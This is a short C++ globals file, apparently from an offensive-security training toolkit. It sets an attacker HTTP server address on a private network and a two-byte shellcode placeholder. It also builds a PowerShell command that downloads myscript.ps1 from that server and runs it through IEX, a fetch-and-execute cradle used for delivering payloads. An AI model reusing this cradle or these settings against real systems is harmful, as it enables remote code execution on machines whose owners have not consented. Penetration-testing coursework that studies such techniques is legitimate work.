#include "OSEPGlobals.h"
#include <string>

static std::string HTTP_IP = std::string("192.168.37.130");
static std::string HTTP_PORT = std::string("80");
static std::string HTTP_URL = std::string("http://") + HTTP_IP + ":" + HTTP_PORT;


bool ENCODED = false;

unsigned char SHELLCODE[] = { 0xfc,0x48 };

std::string PS_STATIC_COMMAND = std::string("") + "(New-Object System.Net.WebClient).DownloadString('" + HTTP_URL + "/myscript.ps1') | IEX";